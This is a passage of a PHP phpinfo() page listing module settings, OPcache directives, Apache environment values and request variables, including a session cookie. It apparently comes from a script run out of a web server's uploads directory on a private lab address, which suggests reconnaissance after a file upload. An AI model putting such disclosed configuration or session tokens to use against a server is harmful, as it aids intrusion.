                    <td class="v">PHP_SESSION_UPLOAD_PROGRESS</td>
                    <td class="v">PHP_SESSION_UPLOAD_PROGRESS</td>
                </tr>
                <tr>
                    <td class="e">session.upload_progress.prefix</td>
                    <td class="v">upload_progress_</td>
                    <td class="v">upload_progress_</td>
                </tr>
                <tr>
                    <td class="e">session.use_cookies</td>
                    <td class="v">1</td>
                    <td class="v">1</td>
                </tr>
                <tr>
                    <td class="e">session.use_only_cookies</td>
                    <td class="v">1</td>
                    <td class="v">1</td>
                </tr>
                <tr>
                    <td class="e">session.use_strict_mode</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
                <tr>
                    <td class="e">session.use_trans_sid</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
            </table>
            <h2>
                <a name="module_shmop">shmop</a>
            </h2>
            <table>
                <tr>
                    <td class="e">shmop support </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_sockets">sockets</a>
            </h2>
            <table>
                <tr>
                    <td class="e">Sockets Support </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_sodium">sodium</a>
            </h2>
            <table>
                <tr class="h">
                    <th>sodium support</th>
                    <th>enabled</th>
                </tr>
                <tr>
                    <td class="e">libsodium headers version </td>
                    <td class="v">1.0.18 </td>
                </tr>
                <tr>
                    <td class="e">libsodium library version </td>
                    <td class="v">1.0.18 </td>
                </tr>
            </table>
            <h2>
                <a name="module_spl">SPL</a>
            </h2>
            <table>
                <tr class="h">
                    <th>SPL support</th>
                    <th>enabled</th>
                </tr>
                <tr>
                    <td class="e">Interfaces </td>
                    <td class="v">OuterIterator, RecursiveIterator, SeekableIterator, SplObserver, SplSubject </td>
                </tr>
                <tr>
                    <td class="e">Classes </td>
                    <td class="v">AppendIterator, ArrayIterator, ArrayObject, BadFunctionCallException, BadMethodCallException, CachingIterator, CallbackFilterIterator, DirectoryIterator, DomainException, EmptyIterator, FilesystemIterator, FilterIterator, GlobIterator, InfiniteIterator, InvalidArgumentException, IteratorIterator, LengthException, LimitIterator, LogicException, MultipleIterator, NoRewindIterator, OutOfBoundsException, OutOfRangeException, OverflowException, ParentIterator, RangeException, RecursiveArrayIterator, RecursiveCachingIterator, RecursiveCallbackFilterIterator, RecursiveDirectoryIterator, RecursiveFilterIterator, RecursiveIteratorIterator, RecursiveRegexIterator, RecursiveTreeIterator, RegexIterator, RuntimeException, SplDoublyLinkedList, SplFileInfo, SplFileObject, SplFixedArray, SplHeap, SplMinHeap, SplMaxHeap, SplObjectStorage, SplPriorityQueue, SplQueue, SplStack, SplTempFileObject, UnderflowException, UnexpectedValueException </td>
                </tr>
            </table>
            <h2>
                <a name="module_standard">standard</a>
            </h2>
            <table>
                <tr>
                    <td class="e">Dynamic Library Support </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">Path to sendmail </td>
                    <td class="v">/usr/sbin/sendmail -t -i </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">assert.active</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">assert.bail</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">assert.callback</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">assert.exception</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">assert.warning</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">auto_detect_line_endings</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">default_socket_timeout</td>
                    <td class="v">60</td>
                    <td class="v">60</td>
                </tr>
                <tr>
                    <td class="e">from</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">session.trans_sid_hosts</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">session.trans_sid_tags</td>
                    <td class="v">a=href,area=href,frame=src,form=</td>
                    <td class="v">a=href,area=href,frame=src,form=</td>
                </tr>
                <tr>
                    <td class="e">unserialize_max_depth</td>
                    <td class="v">4096</td>
                    <td class="v">4096</td>
                </tr>
                <tr>
                    <td class="e">url_rewriter.hosts</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">url_rewriter.tags</td>
                    <td class="v">form=</td>
                    <td class="v">form=</td>
                </tr>
                <tr>
                    <td class="e">user_agent</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
            </table>
            <h2>
                <a name="module_sysvmsg">sysvmsg</a>
            </h2>
            <table>
                <tr>
                    <td class="e">sysvmsg support </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_sysvsem">sysvsem</a>
            </h2>
            <table>
                <tr>
                    <td class="e">sysvsem support </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_sysvshm">sysvshm</a>
            </h2>
            <table>
                <tr>
                    <td class="e">sysvshm support </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_tokenizer">tokenizer</a>
            </h2>
            <table>
                <tr>
                    <td class="e">Tokenizer Support </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_zend+opcache">Zend OPcache</a>
            </h2>
            <table>
                <tr>
                    <td class="e">Opcode Caching </td>
                    <td class="v">Up and Running </td>
                </tr>
                <tr>
                    <td class="e">Optimization </td>
                    <td class="v">Enabled </td>
                </tr>
                <tr>
                    <td class="e">SHM Cache </td>
                    <td class="v">Enabled </td>
                </tr>
                <tr>
                    <td class="e">File Cache </td>
                    <td class="v">Disabled </td>
                </tr>
                <tr>
                    <td class="e">JIT </td>
                    <td class="v">Disabled </td>
                </tr>
                <tr>
                    <td class="e">Startup </td>
                    <td class="v">OK </td>
                </tr>
                <tr>
                    <td class="e">Shared memory model </td>
                    <td class="v">mmap </td>
                </tr>
                <tr>
                    <td class="e">Cache hits </td>
                    <td class="v">3 </td>
                </tr>
                <tr>
                    <td class="e">Cache misses </td>
                    <td class="v">5 </td>
                </tr>
                <tr>
                    <td class="e">Used memory </td>
                    <td class="v">9179232 </td>
                </tr>
                <tr>
                    <td class="e">Free memory </td>
                    <td class="v">125038496 </td>
                </tr>
                <tr>
                    <td class="e">Wasted memory </td>
                    <td class="v">0 </td>
                </tr>
                <tr>
                    <td class="e">Interned Strings Used memory </td>
                    <td class="v">227472 </td>
                </tr>
                <tr>
                    <td class="e">Interned Strings Free memory </td>
                    <td class="v">6063520 </td>
                </tr>
                <tr>
                    <td class="e">Cached scripts </td>
                    <td class="v">5 </td>
                </tr>
                <tr>
                    <td class="e">Cached keys </td>
                    <td class="v">5 </td>
                </tr>
                <tr>
                    <td class="e">Max keys </td>
                    <td class="v">16229 </td>
                </tr>
                <tr>
                    <td class="e">OOM restarts </td>
                    <td class="v">0 </td>
                </tr>
                <tr>
                    <td class="e">Hash keys restarts </td>
                    <td class="v">0 </td>
                </tr>
                <tr>
                    <td class="e">Manual restarts </td>
                    <td class="v">0 </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">opcache.blacklist_filename</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">opcache.consistency_checks</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
                <tr>
                    <td class="e">opcache.dups_fix</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">opcache.enable</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">opcache.enable_cli</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">opcache.enable_file_override</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">opcache.error_log</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">opcache.file_cache</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">opcache.file_cache_consistency_checks</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">opcache.file_cache_only</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">opcache.file_update_protection</td>
                    <td class="v">2</td>
                    <td class="v">2</td>
                </tr>
                <tr>
                    <td class="e">opcache.force_restart_timeout</td>
                    <td class="v">180</td>
                    <td class="v">180</td>
                </tr>
                <tr>
                    <td class="e">opcache.huge_code_pages</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">opcache.interned_strings_buffer</td>
                    <td class="v">8</td>
                    <td class="v">8</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit</td>
                    <td class="v">tracing</td>
                    <td class="v">tracing</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_bisect_limit</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_blacklist_root_trace</td>
                    <td class="v">16</td>
                    <td class="v">16</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_blacklist_side_trace</td>
                    <td class="v">8</td>
                    <td class="v">8</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_buffer_size</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_debug</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_hot_func</td>
                    <td class="v">127</td>
                    <td class="v">127</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_hot_loop</td>
                    <td class="v">64</td>
                    <td class="v">64</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_hot_return</td>
                    <td class="v">8</td>
                    <td class="v">8</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_hot_side_exit</td>
                    <td class="v">8</td>
                    <td class="v">8</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_max_exit_counters</td>
                    <td class="v">8192</td>
                    <td class="v">8192</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_max_loop_unrolls</td>
                    <td class="v">8</td>
                    <td class="v">8</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_max_polymorphic_calls</td>
                    <td class="v">2</td>
                    <td class="v">2</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_max_recursive_calls</td>
                    <td class="v">2</td>
                    <td class="v">2</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_max_recursive_returns</td>
                    <td class="v">2</td>
                    <td class="v">2</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_max_root_traces</td>
                    <td class="v">1024</td>
                    <td class="v">1024</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_max_side_traces</td>
                    <td class="v">128</td>
                    <td class="v">128</td>
                </tr>
                <tr>
                    <td class="e">opcache.jit_prof_threshold</td>
                    <td class="v">0.005</td>
                    <td class="v">0.005</td>
                </tr>
                <tr>
                    <td class="e">opcache.lockfile_path</td>
                    <td class="v">/tmp</td>
                    <td class="v">/tmp</td>
                </tr>
                <tr>
                    <td class="e">opcache.log_verbosity_level</td>
                    <td class="v">1</td>
                    <td class="v">1</td>
                </tr>
                <tr>
                    <td class="e">opcache.max_accelerated_files</td>
                    <td class="v">10000</td>
                    <td class="v">10000</td>
                </tr>
                <tr>
                    <td class="e">opcache.max_file_size</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
                <tr>
                    <td class="e">opcache.max_wasted_percentage</td>
                    <td class="v">5</td>
                    <td class="v">5</td>
                </tr>
                <tr>
                    <td class="e">opcache.memory_consumption</td>
                    <td class="v">128</td>
                    <td class="v">128</td>
                </tr>
                <tr>
                    <td class="e">opcache.opt_debug_level</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
                <tr>
                    <td class="e">opcache.optimization_level</td>
                    <td class="v">0x7FFEBFFF</td>
                    <td class="v">0x7FFEBFFF</td>
                </tr>
                <tr>
                    <td class="e">opcache.preferred_memory_model</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">opcache.preload</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">opcache.preload_user</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">opcache.protect_memory</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">opcache.record_warnings</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">opcache.restrict_api</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">opcache.revalidate_freq</td>
                    <td class="v">2</td>
                    <td class="v">2</td>
                </tr>
                <tr>
                    <td class="e">opcache.revalidate_path</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">opcache.save_comments</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">opcache.use_cwd</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">opcache.validate_permission</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">opcache.validate_root</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">opcache.validate_timestamps</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
            </table>
            <h2>
                <a name="module_zlib">zlib</a>
            </h2>
            <table>
                <tr class="h">
                    <th>ZLib Support</th>
                    <th>enabled</th>
                </tr>
                <tr>
                    <td class="e">Stream Wrapper </td>
                    <td class="v">compress.zlib:// </td>
                </tr>
                <tr>
                    <td class="e">Stream Filter </td>
                    <td class="v">zlib.inflate, zlib.deflate </td>
                </tr>
                <tr>
                    <td class="e">Compiled Version </td>
                    <td class="v">1.2.11 </td>
                </tr>
                <tr>
                    <td class="e">Linked Version </td>
                    <td class="v">1.2.11 </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">zlib.output_compression</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">zlib.output_compression_level</td>
                    <td class="v">-1</td>
                    <td class="v">-1</td>
                </tr>
                <tr>
                    <td class="e">zlib.output_handler</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
            </table>
            <h2>Additional Modules</h2>
            <table>
                <tr class="h">
                    <th>Module Name</th>
                </tr>
            </table>
            <h2>Environment</h2>
            <table>
                <tr class="h">
                    <th>Variable</th>
                    <th>Value</th>
                </tr>
                <tr>
                    <td class="e">APACHE_RUN_DIR </td>
                    <td class="v">/var/run/apache2 </td>
                </tr>
                <tr>
                    <td class="e">SYSTEMD_EXEC_PID </td>
                    <td class="v">847 </td>
                </tr>
                <tr>
                    <td class="e">APACHE_PID_FILE </td>
                    <td class="v">/var/run/apache2/apache2.pid </td>
                </tr>
                <tr>
                    <td class="e">JOURNAL_STREAM </td>
                    <td class="v">8:21275 </td>
                </tr>
                <tr>
                    <td class="e">PATH </td>
                    <td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin </td>
                </tr>
                <tr>
                    <td class="e">INVOCATION_ID </td>
                    <td class="v">6cbd236d37c549f88bc3a78148b360a5 </td>
                </tr>
                <tr>
                    <td class="e">APACHE_LOCK_DIR </td>
                    <td class="v">/var/lock/apache2 </td>
                </tr>
                <tr>
                    <td class="e">LANG </td>
                    <td class="v">C </td>
                </tr>
                <tr>
                    <td class="e">APACHE_RUN_USER </td>
                    <td class="v">www-data </td>
                </tr>
                <tr>
                    <td class="e">APACHE_RUN_GROUP </td>
                    <td class="v">www-data </td>
                </tr>
                <tr>
                    <td class="e">APACHE_LOG_DIR </td>
                    <td class="v">/var/log/apache2 </td>
                </tr>
                <tr>
                    <td class="e">PWD </td>
                    <td class="v">/ </td>
                </tr>
            </table>
            <h2>PHP Variables</h2>
            <table>
                <tr class="h">
                    <th>Variable</th>
                    <th>Value</th>
                </tr>
                <tr>
                    <td class="e">$_COOKIE['PHPSESSID']</td>
                    <td class="v">kg18bscd0cqreu5n1bq8c143ao</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['HTTP_HOST']</td>
                    <td class="v">192.168.115.112</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['HTTP_CONNECTION']</td>
                    <td class="v">keep-alive</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS']</td>
                    <td class="v">1</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['HTTP_USER_AGENT']</td>
                    <td class="v">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['HTTP_ACCEPT']</td>
                    <td class="v">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['HTTP_SEC_GPC']</td>
                    <td class="v">1</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['HTTP_ACCEPT_LANGUAGE']</td>
                    <td class="v">en-US,en;q=0.5</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['HTTP_REFERER']</td>
                    <td class="v">http://192.168.115.112/uploads/</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['HTTP_ACCEPT_ENCODING']</td>
                    <td class="v">gzip, deflate</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['HTTP_COOKIE']</td>
                    <td class="v">PHPSESSID=kg18bscd0cqreu5n1bq8c143ao</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['PATH']</td>
                    <td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['SERVER_SIGNATURE']</td>
                    <td class="v">&lt;address &gt;Apache/2.4.52 (Ubuntu) Server at 192.168.115.112 Port 80 &lt;/address &gt;</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['SERVER_SOFTWARE']</td>
                    <td class="v">Apache/2.4.52 (Ubuntu)</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['SERVER_NAME']</td>
                    <td class="v">192.168.115.112</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['SERVER_ADDR']</td>
                    <td class="v">192.168.115.112</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['SERVER_PORT']</td>
                    <td class="v">80</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['REMOTE_ADDR']</td>
                    <td class="v">192.168.49.115</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['DOCUMENT_ROOT']</td>
                    <td class="v">/var/www/html</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['REQUEST_SCHEME']</td>
                    <td class="v">http</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['CONTEXT_PREFIX']</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['CONTEXT_DOCUMENT_ROOT']</td>
                    <td class="v">/var/www/html</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['SERVER_ADMIN']</td>
                    <td class="v">webmaster@localhost</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['SCRIPT_FILENAME']</td>
                    <td class="v">/var/www/html/uploads/audit.php</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['REMOTE_PORT']</td>
                    <td class="v">54492</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['GATEWAY_INTERFACE']</td>
                    <td class="v">CGI/1.1</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['SERVER_PROTOCOL']</td>
                    <td class="v">HTTP/1.1</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['REQUEST_METHOD']</td>
                    <td class="v">GET</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['QUERY_STRING']</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['REQUEST_URI']</td>
                    <td class="v">/uploads/audit.php</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['SCRIPT_NAME']</td>
                    <td class="v">/uploads/audit.php</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['PHP_SELF']</td>
                    <td class="v">/uploads/audit.php</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['REQUEST_TIME_FLOAT']</td>
                    <td class="v">1768064656.7947</td>
                </tr>
                <tr>
                    <td class="e">$_SERVER['REQUEST_TIME']</td>
                    <td class="v">1768064656</td>
                </tr>
            </table>
            <hr/>
            <h1>PHP Credits</h1>
            <table>
                <tr class="h">
                    <th>PHP Group</th>
                </tr>
                <tr>
                    <td class="e">Thies C. Arntzen, Stig Bakken, Shane Caraveo, Andi Gutmans, Rasmus Lerdorf, Sam Ruby, Sascha Schumann, Zeev Suraski, Jim Winstead, Andrei Zmievski </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Language Design &amp;Concept</th>
                </tr>
                <tr>
                    <td class="e">Andi Gutmans, Rasmus Lerdorf, Zeev Suraski, Marcus Boerger </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th colspan="2">PHP Authors</th>
                </tr>
                <tr class="h">
                    <th>Contribution</th>
                    <th>Authors</th>
                </tr>
                <tr>
                    <td class="e">Zend Scripting Language Engine </td>
                    <td class="v">Andi Gutmans, Zeev Suraski, Stanislav Malyshev, Marcus Boerger, Dmitry Stogov, Xinchen Hui, Nikita Popov </td>
                </tr>
                <tr>
                    <td class="e">Extension Module API </td>
                    <td class="v">Andi Gutmans, Zeev Suraski, Andrei Zmievski </td>
                </tr>
                <tr>
                    <td class="e">UNIX Build and Modularization </td>
                    <td class="v">Stig Bakken, Sascha Schumann, Jani Taskinen, Peter Kokot </td>
                </tr>
                <tr>
                    <td class="e">Windows Support </td>
                    <td class="v">Shane Caraveo, Zeev Suraski, Wez Furlong, Pierre-Alain Joye, Anatol Belski, Kalle Sommer Nielsen </td>
                </tr>
                <tr>
                    <td class="e">Server API (SAPI) Abstraction Layer </td>
                    <td class="v">Andi Gutmans, Shane Caraveo, Zeev Suraski </td>
                </tr>
                <tr>
                    <td class="e">Streams Abstraction Layer </td>
                    <td class="v">Wez Furlong, Sara Golemon </td>
                </tr>
                <tr>
                    <td class="e">PHP Data Objects Layer </td>
                    <td class="v">Wez Furlong, Marcus Boerger, Sterling Hughes, George Schlossnagle, Ilia Alshanetsky </td>
                </tr>
                <tr>
                    <td class="e">Output Handler </td>
                    <td class="v">Zeev Suraski, Thies C. Arntzen, Marcus Boerger, Michael Wallner </td>
                </tr>
                <tr>
                    <td class="e">Consistent 64 bit support </td>
                    <td class="v">Anthony Ferrara, Anatol Belski </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th colspan="2">SAPI Modules</th>
                </tr>
                <tr class="h">
                    <th>Contribution</th>
                    <th>Authors</th>
                </tr>
                <tr>
                    <td class="e">Apache 2.0 Handler </td>
                    <td class="v">Ian Holsman, Justin Erenkrantz (based on Apache 2.0 Filter code) </td>
                </tr>
                <tr>
                    <td class="e">CGI / FastCGI </td>
                    <td class="v">Rasmus Lerdorf, Stig Bakken, Shane Caraveo, Dmitry Stogov </td>
                </tr>
                <tr>
                    <td class="e">CLI </td>
                    <td class="v">Edin Kadribasic, Marcus Boerger, Johannes Schlueter, Moriyoshi Koizumi, Xinchen Hui </td>
                </tr>
                <tr>
                    <td class="e">Embed </td>
                    <td class="v">Edin Kadribasic </td>
                </tr>
                <tr>
                    <td class="e">FastCGI Process Manager </td>
                    <td class="v">Andrei Nigmatulin, dreamcat4, Antony Dovgal, Jerome Loyet </td>
                </tr>
                <tr>
                    <td class="e">litespeed </td>
                    <td class="v">George Wang </td>
                </tr>
                <tr>
                    <td class="e">phpdbg </td>
                    <td class="v">Felipe Pena, Joe Watkins, Bob Weinand </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th colspan="2">Module Authors</th>
                </tr>
                <tr class="h">
                    <th>Module</th>
                    <th>Authors</th>
                </tr>
                <tr>
                    <td class="e">BC Math </td>
                    <td class="v">Andi Gutmans </td>
                </tr>
                <tr>
                    <td class="e">Bzip2 </td>
                    <td class="v">Sterling Hughes </td>
                </tr>
                <tr>
                    <td class="e">Calendar </td>
                    <td class="v">Shane Caraveo, Colin Viebrock, Hartmut Holzgraefe, Wez Furlong </td>
                </tr>
                <tr>
                    <td class="e">COM and .Net </td>
                    <td class="v">Wez Furlong </td>
                </tr>
                <tr>
                    <td class="e">ctype </td>
                    <td class="v">Hartmut Holzgraefe </td>
                </tr>
                <tr>
                    <td class="e">cURL </td>
                    <td class="v">Sterling Hughes </td>
                </tr>
                <tr>
                    <td class="e">Date/Time Support </td>
                    <td class="v">Derick Rethans </td>
                </tr>
                <tr>
                    <td class="e">DB-LIB (MS SQL, Sybase) </td>
                    <td class="v">Wez Furlong, Frank M. Kromann, Adam Baratz </td>
                </tr>
                <tr>
                    <td class="e">DBA </td>
                    <td class="v">Sascha Schumann, Marcus Boerger </td>
                </tr>
                <tr>
                    <td class="e">DOM </td>
                    <td class="v">Christian Stocker, Rob Richards, Marcus Boerger </td>
                </tr>
                <tr>
                    <td class="e">enchant </td>
                    <td class="v">Pierre-Alain Joye, Ilia Alshanetsky </td>
                </tr>
                <tr>
                    <td class="e">EXIF </td>
                    <td class="v">Rasmus Lerdorf, Marcus Boerger </td>
                </tr>
                <tr>
                    <td class="e">FFI </td>
                    <td class="v">Dmitry Stogov </td>
                </tr>
                <tr>
                    <td class="e">fileinfo </td>
                    <td class="v">Ilia Alshanetsky, Pierre Alain Joye, Scott MacVicar, Derick Rethans, Anatol Belski </td>
                </tr>
                <tr>
                    <td class="e">Firebird driver for PDO </td>
                    <td class="v">Ard Biesheuvel </td>
                </tr>
                <tr>
                    <td class="e">FTP </td>
                    <td class="v">Stefan Esser, Andrew Skalski </td>
                </tr>
                <tr>
                    <td class="e">GD imaging </td>
                    <td class="v">Rasmus Lerdorf, Stig Bakken, Jim Winstead, Jouni Ahto, Ilia Alshanetsky, Pierre-Alain Joye, Marcus Boerger, Mark Randall </td>
                </tr>
                <tr>
                    <td class="e">GetText </td>
                    <td class="v">Alex Plotnick </td>
                </tr>
                <tr>
                    <td class="e">GNU GMP support </td>
                    <td class="v">Stanislav Malyshev </td>
                </tr>
                <tr>
                    <td class="e">Iconv </td>
                    <td class="v">Rui Hirokawa, Stig Bakken, Moriyoshi Koizumi </td>
                </tr>
                <tr>
                    <td class="e">IMAP </td>
                    <td class="v">Rex Logan, Mark Musone, Brian Wang, Kaj-Michael Lang, Antoni Pamies Olive, Rasmus Lerdorf, Andrew Skalski, Chuck Hagenbuch, Daniel R Kalowsky </td>
                </tr>
                <tr>
                    <td class="e">Input Filter </td>
                    <td class="v">Rasmus Lerdorf, Derick Rethans, Pierre-Alain Joye, Ilia Alshanetsky </td>
                </tr>
                <tr>
                    <td class="e">Internationalization </td>
                    <td class="v">Ed Batutis, Vladimir Iordanov, Dmitry Lakhtyuk, Stanislav Malyshev, Vadim Savchuk, Kirti Velankar </td>
                </tr>
                <tr>
                    <td class="e">JSON </td>
                    <td class="v">Jakub Zelenka, Omar Kilani, Scott MacVicar </td>
                </tr>
                <tr>
                    <td class="e">LDAP </td>
                    <td class="v">Amitay Isaacs, Eric Warnke, Rasmus Lerdorf, Gerrit Thomson, Stig Venaas </td>
                </tr>
                <tr>
                    <td class="e">LIBXML </td>
                    <td class="v">Christian Stocker, Rob Richards, Marcus Boerger, Wez Furlong, Shane Caraveo </td>
                </tr>
                <tr>
                    <td class="e">Multibyte String Functions </td>
                    <td class="v">Tsukada Takuya, Rui Hirokawa </td>
                </tr>
                <tr>
                    <td class="e">MySQL driver for PDO </td>
                    <td class="v">George Schlossnagle, Wez Furlong, Ilia Alshanetsky, Johannes Schlueter </td>
                </tr>
                <tr>
                    <td class="e">MySQLi </td>
                    <td class="v">Zak Greant, Georg Richter, Andrey Hristov, Ulf Wendel </td>
                </tr>
                <tr>
                    <td class="e">MySQLnd </td>
                    <td class="v">Andrey Hristov, Ulf Wendel, Georg Richter, Johannes Schlüter </td>
                </tr>
                <tr>
                    <td class="e">OCI8 </td>
